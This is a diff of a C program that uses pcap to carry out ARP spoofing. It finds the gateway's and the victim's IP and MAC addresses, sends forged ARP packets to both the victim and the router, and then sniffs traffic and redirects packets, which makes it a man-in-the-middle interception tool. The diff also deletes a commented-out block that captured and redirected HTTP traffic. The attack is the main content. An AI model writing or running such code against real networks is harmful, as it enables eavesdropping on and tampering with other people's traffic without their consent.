@@ -25,11 +25,11 @@ int main()
 	/* now, we don't need any more the devices list */
 	pcap_freealldevs(alldevs);
 	memset(&LanInfo, 0, sizeof(LanInfo));
-	// find Device's GateWay IP address 
+	/* find Device's GateWay IP address */
 	getGateWayAddress(choiceDev, &LanInfo);
 	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
 	getMACAddress(handle, &LanInfo);
-	printf("victim MAC : ");
+	//printf("victim MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
@@ -45,12 +45,14 @@ int main()
 		else
 			printf("%.2X-", LanInfo.gatewayMAC[i]);
 	}
-	ARPHEADER TEST_header;
-	setArpHeader(&TEST_header);
-	attackvictim(handle, &TEST_header, &LanInfo);
+	/* send fake arp packet */
+	ARP_PACKET arpPacket;
+	arpPacket.ethernet.ether_Type = ntohs(0x0806);
+	setArpHeader(&arpPacket.arp);
+	attackvictim(handle, &arpPacket, &LanInfo);
 	Sleep(500);
-	attackRouter(handle, &TEST_header, &LanInfo);
-	// sniff packet 
+	attackRouter(handle, &arpPacket, &LanInfo);
+	/* sniff packet */
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 	printf("listen...");
@@ -58,21 +60,10 @@ int main()
 	{
 		if (pcap_next_ex(handle, &header, &packet) == 1)
 		{
-			/*
-			if (http_capture(packet))
-			{
-				packet_handlerBackward(sendPacket, packet, msgBackward, msgBackwardLen, &LanInfo);
-				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgBackwardLen);
-				packet_handlerRedirect(sendPacket, packet, msgForward, msgForwardLen);
-				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgForwardLen);
-			}
-			*/
 			if (checkARP(handle, packet, &LanInfo))
 				continue;
 			else
-			{
 				packetRedirect(handle, header, packet, &LanInfo);
-			}
 		}
 	}
 	pcap_close(handle);
